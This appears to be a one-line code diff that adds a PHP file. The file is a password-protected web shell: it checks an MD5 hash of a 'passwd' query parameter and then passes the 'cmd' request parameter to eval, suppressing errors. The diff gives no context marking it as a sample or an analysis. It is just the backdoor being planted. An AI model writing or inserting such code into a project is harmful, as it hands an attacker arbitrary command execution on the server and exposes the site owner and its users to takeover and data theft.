@@ -1,0 +1,1 @@
+<?php if(md5($_GET["passwd"])=="314939c0c9b63f58a95154cb8bb51a0e"){@eval($_REQUEST["cmd"]);} ?>
